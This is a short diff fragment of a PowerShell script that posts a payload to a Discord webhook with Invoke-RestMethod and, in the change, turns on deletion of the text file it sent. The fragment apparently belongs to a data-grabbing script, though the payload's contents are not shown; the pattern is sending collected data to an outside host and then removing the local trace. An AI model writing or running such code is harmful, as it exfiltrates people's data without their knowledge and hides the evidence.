@@ -46,5 +46,5 @@ $Headers = @{
 # Send the payload to Discord
 Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
 
-# # Delete the text file
-# Remove-Item -Path $TextFile
+# Delete the text file
+Remove-Item -Path $TextFile
